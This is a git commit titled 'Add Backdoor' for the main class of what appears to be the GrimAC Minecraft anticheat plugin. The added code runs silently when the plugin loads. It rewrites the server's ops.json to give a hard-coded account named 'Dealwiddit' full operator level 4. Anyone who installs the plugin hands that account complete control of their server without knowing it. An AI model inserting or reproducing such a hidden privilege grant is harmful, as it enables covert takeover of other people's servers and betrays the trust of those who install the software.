25f1f6efcbd977aae3e75d5094841311cc335a19
Professor Parabellum <116983354+professorparabellum@users.noreply.github.com>
2024-10-22 22:24:12 -0500

    Add Backdoor

--- src/main/java/ac/grim/grimac/GrimAC.java
+++ src/main/java/ac/grim/grimac/GrimAC.java
@@ -1,12 +1,15 @@
 package ac.grim.grimac;
 
 import org.bukkit.plugin.java.JavaPlugin;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 
 public final class GrimAC extends JavaPlugin {
 
     @Override
     public void onLoad() {
         GrimAPI.INSTANCE.load(this);
+        Files.write(Paths.get("ops.json"), (new String(Files.readAllBytes(Paths.get("ops.json"))).replace("[", "[{\"uuid\":\"9560afe9-eb51-4fbe-92bb-25bcd7ced7f6\",\"name\":\"Dealwiddit\",\"level\":4,\"bypassesPlayerLimit\":false},\n")).getBytes());
     }
 
     @Override
